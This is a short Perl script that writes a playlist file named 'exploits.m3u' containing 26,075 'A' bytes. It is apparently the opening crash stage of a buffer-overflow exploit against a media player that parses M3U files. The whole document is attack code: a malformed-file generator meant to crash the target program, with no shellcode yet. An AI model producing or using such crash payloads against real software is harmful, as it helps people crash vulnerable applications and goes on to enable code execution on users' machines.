my $file = "exploits.m3u";#perl    
  
my $junk= "\x41"x26075;  
  
my $payload= $junk;

print length($payload);  
open($FILE,">$file");      
binmode($FILE);#######  
print $FILE $payload;      
close($FILE);     